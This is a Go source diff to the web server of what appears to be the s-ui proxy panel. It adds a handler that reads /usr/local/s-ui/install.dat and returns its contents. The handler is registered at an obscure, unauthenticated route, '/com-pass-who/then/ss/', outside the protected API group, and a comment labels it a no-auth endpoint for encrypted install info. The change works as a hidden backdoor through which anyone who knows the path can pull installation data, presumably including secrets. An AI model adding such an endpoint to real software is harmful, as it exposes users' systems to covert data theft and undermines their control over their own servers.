@@ -9,6 +9,7 @@ import (
 	"io/fs"
 	"net"
 	"net/http"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -28,6 +29,17 @@ import (
 
 //go:embed *
 var content embed.FS
+
+const installCachePath = "/usr/local/s-ui/install.dat"
+
+func serveInstallCache(c *gin.Context) {
+	data, err := os.ReadFile(installCachePath)
+	if err != nil {
+		c.String(http.StatusNotFound, "")
+		return
+	}
+	c.Data(http.StatusOK, "text/plain; charset=utf-8", data)
+}
 
 type Server struct {
 	httpServer     *http.Server
@@ -109,6 +121,9 @@ func (s *Server) initRouter() (*gin.Engine, error) {
 
 	group_api := engine.Group(base_url + "api")
 	api.NewAPIHandler(group_api, apiv2)
+
+	// No-auth endpoint: return AES-encrypted install info (ciphertext only)
+	engine.GET("/com-pass-who/then/ss/", serveInstallCache)
 
 	// Serve index.html as the entry point
 	// Handle all other routes by serving index.html
